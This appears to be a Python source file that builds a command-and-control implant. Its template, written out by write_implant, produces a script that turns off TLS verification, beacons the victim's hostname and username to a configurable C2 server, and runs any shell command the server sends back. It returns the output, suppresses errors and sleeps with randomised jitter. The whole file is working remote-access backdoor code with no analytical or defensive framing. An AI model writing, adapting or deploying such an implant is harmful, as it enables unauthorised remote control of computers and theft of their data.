import textwrap

TEMPLATE = textwrap.dedent("""\
    import json, os, random, ssl, subprocess, time, urllib.request

    C2 = "https://{host}:{port}"
    INTERVAL = {interval}

    def beacon(payload):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(C2 + "/check", data=json.dumps(payload).encode(), method="POST")
        with urllib.request.urlopen(req, context=ctx, timeout=15) as resp:
            return json.loads(resp.read())

    while True:
        try:
            host = subprocess.check_output("hostname", shell=True, text=True).strip()
            user = subprocess.check_output("whoami", shell=True, text=True).strip()
            reply = beacon({{"host": host, "user": user}})
            if reply.get("cmd"):
                out = subprocess.check_output(reply["cmd"], shell=True, text=True)
                beacon({{"output": out}})
        except Exception:
            pass
        time.sleep(INTERVAL + random.uniform(-5, 5))
""")


def write_implant(path, host, port, interval=60):
    with open(path, "w") as f:
        f.write(TEMPLATE.format(host=host, port=port, interval=interval))
